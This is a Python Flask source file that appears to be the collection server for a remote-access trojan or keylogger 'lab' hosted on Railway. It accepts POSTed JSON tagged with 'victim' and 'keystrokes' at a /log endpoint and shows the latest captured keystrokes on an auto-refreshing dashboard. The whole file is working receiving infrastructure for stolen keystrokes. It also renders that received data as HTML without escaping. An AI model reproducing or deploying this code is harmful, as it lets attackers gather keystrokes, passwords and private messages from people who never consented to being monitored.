from flask import Flask, request, jsonify
from flask_cors import CORS
import os  # CRITICAL FOR RAILWAY

app = Flask(__name__)
CORS(app)

data_store = []

@app.route('/')
def home():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>✅ Cyber Lab - WORKING</title>
        <meta http-equiv="refresh" content="3">
        <style>
            body { font-family: Arial; margin: 40px; }
            h1 { color: green; }
            .data { background: #f0f0f0; padding: 15px; margin: 10px; }
        </style>
    </head>
    <body>
        <h1>✅ Cybersecurity RAT Lab - ONLINE</h1>
        <p>Server is running on Railway</p>
        <hr>
        <h3>Received Data:</h3>
    '''
    
    if data_store:
        for item in data_store[-5:]:  # Show last 5
            html += f'''
            <div class="data">
                <strong>{item.get('victim', 'Unknown')}:</strong><br>
                {item.get('keystrokes', 'No data')}
            </div>
            '''
    else:
        html += '<p><em>No data received yet. Run client to send data.</em></p>'
    
    html += f'''
        <hr>
        <p>Total entries: {len(data_store)}</p>
        <p><a href="/test">Test Connection</a></p>
    </body>
    </html>
    '''
    return html

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    data_store.append(data)
    print(f"✅ RECEIVED from {data.get('victim', 'Unknown')}")
    return jsonify({"status": "received", "total": len(data_store)})

@app.route('/test')
def test():
    return jsonify({
        "status": "online",
        "port": os.environ.get("PORT", "8080"),
        "entries": len(data_store)
    })

# ==== CRITICAL FOR RAILWAY ====
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    print(f"🚀 Server starting on port {port}")
    print(f"📡 POST data to: /log")
    app.run(host='0.0.0.0', port=port)

